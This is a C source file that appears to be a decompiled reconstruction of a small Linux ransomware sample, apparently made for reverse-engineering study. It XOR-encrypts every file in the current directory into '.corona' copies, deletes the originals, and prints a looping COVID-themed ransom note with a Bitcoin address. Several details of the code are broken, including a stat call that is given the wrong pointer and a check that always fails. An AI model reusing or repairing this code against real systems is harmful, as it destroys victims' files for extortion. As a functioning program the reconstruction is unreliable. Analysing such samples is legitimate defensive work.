#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <dirent.h>
#include <stdio.h>
#include <sys/stat.h>
#include "registers.h"

void stat_wrapper(char *filename, struct stat *stat_struct){
    stat(filename, &stat_struct);
}

int xstat_wrapper_func(char *filename){
    char *var_a8 = filename;
    struct stat var_a0;
    stat_wrapper(var_a8, &var_a0);

    return 0;
}

void fcn_00000c30(char *filename, char *new_fn){
    char *s2 = filename; /* [rbp-0x10] */
    char *s1 = new_fn;   /* [rbp-0x08] */
    int x;

    strcpy(new_fn, "./\0");
    strcat(new_fn, filename);

    for(x = 0; new_fn[x]; x++);
    strcpy((new_fn+x), ".corona");

    return;
}

void main(int argc, char **argv){
    int var_b4 = argc;         /* [rbp-0xb4] */
    char **var_s = argv;       /* [rbp-0xc0] */
    char var_80[56] = 0x20;    /* [rbp-0x80] */
    uint8_t var_c = 0;         /* [rbp-0xa5] */
    uint32_t var_a4 = 0;       /* [rbp-0xa4] */
    char dest[56];             /* [rbp-0x40] */
    DIR *var_a0;               /* [rbp-0xa0] */
    struct dirent *filename;   /* [rbp-0x98] */
    FILE *stream;              /* [rbp-0x90] */
    FILE *var_88;              /* [rbp-0x88] */
    uint64_t c;                /* [rbp-0xa5] */

    srand(0xdeadbeef);
    /* call to rand() with some arithmetics.              */
    /* refer to srand.asm for instructions: 0xd07 - 0xd4d */
    /* resulting integer is stored in var_a4              */
    strncpy(dest, (argv[0]+2), strlen(argv[0]));
    var_a0 = opendir(".");
    if(var_a0 != NULL){
        while((filename = readdir(var_a0)) != NULL){
            if(strcmp(dest, filename->d_name) != 0){
                if(xstat_wrapper_func(filename->d_name) != 0){
                    stream = fopen(filename->d_name, "rb");
                    fcn_00000c30(filename->d_name, var_80);
                    var_88 = fopen(var_80, "w");
                    while(!feof(stream)){
                        c = getc(stream);
                        if(feof(stream)) continue;
                        c ^= (uint8_t)var_a4;
                        fputc(c, var_88);
                    }
                    fclose(stream);
                    remove(filename->d_name);
                    fclose(var_88);
                }
            }
            *var_80 = NULL;
        }
        closedir(var_a0);
    }
    for(;;){
        puts("\e[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAH                                                             AHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAH      SO YOU THOUGHT COVID-19 IS ONLY A HUMAN'S VIRUS?       AHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAH     NOW TRANSFER 0.2 BTC TO THE FOLLOWING BITCOIN ADDRESS   AHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAH                 TO GET YOUR FILES BACK                      AHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAH         BTC : 1PC9aZC4hNX2rmmrt7uHTfYAS3hRbph4UN            AHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAH                                                             AHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHAHHA \e[0m");
        sleep(1);
        system("clear");
    }
}